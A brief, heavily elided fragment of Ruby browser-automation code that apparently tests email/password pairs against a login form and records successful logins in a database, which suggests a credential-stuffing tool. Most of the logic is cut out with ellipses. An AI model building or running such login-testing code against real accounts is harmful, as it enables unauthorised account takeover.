...
begin
	...
	puts ''
	def help
		puts "|[	-db => show database successful logins "
	...
	def browserr ( b1 , b2 )
		@browser.text_field( :name => 'email' ).set b1
		    ...
		    sleep 2
		    if @browser.text_field( :name => 'email' ).exists? == false || @browser.text_field( :name => 'pass' ).exists? == false || @browser.button( :name => 'login' ).exists? == false
		            rows2 = []
